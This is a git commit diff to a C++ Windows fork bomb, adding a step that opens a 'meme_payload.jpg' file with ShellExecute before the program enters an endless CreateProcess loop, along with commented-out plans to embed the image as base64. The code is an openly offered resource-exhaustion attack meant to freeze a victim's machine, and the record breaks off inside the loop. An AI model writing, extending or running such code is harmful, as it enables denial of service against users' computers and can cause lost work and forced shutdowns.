eac4b3f4f46f76dbef6480a8b85cd239c07de518
MichaelJereza <mdj1999@gmail.com>
2020-11-10 00:47:12 -0800

    Forkbomb opens a meme_payload.jpg if present

--- forkbomb/forkBombCPP.cpp
+++ forkbomb/forkBombCPP.cpp
@@ -1,18 +1,51 @@
 #include <windows.h>
 #include <stdio.h>
 #include <tchar.h>
+#include <unistd.h>
+#include "base64.h"
+// #include "hard_coded_image.h" not ready yet
+
+bool check_image_exists(){
+    const char* name = "meme_payload.jpg";
+    return ( access ( name, F_OK ) != -1);
+}
+
+// Opens if there is already a hard-coded image
+// Creates if it doesn't exist
+// Returns if image was successful
+bool open_image(STARTUPINFO si, PROCESS_INFORMATION pi){
+
+    if(check_image_exists()){
+        ShellExecute(0, "open", "meme_payload.jpg", NULL, NULL, SW_SHOWNORMAL);
+        return 1;
+    } else {
+        printf("No Payload!");
+        return 1;
+    }
+
+    // I want to hard-code the base64 of the image into the executable so that it will create the image if it doesn't exist
+    // The file will be created once
+
+    // base64_decode(
+    //     hard_coded_base64_image(),
+    //     false                      // Remove line breaks
+    // );
+
+}
 
 int main( )
 {
-    
     STARTUPINFO si;
     PROCESS_INFORMATION pi;
 
     ZeroMemory( &si, sizeof(si) );
     si.cb = sizeof(si);
-    ZeroMemory( &pi, sizeof(pi) );
-    
-    
+    ZeroMemory( &pi, sizeof(pi) );    
+
+    if(!open_image(si, pi)){
+        return 1;
+    };
+ 
     while (1) {
 	   // Start the child process. 
 	   if (!CreateProcess(NULL,   // No module name (use command line)
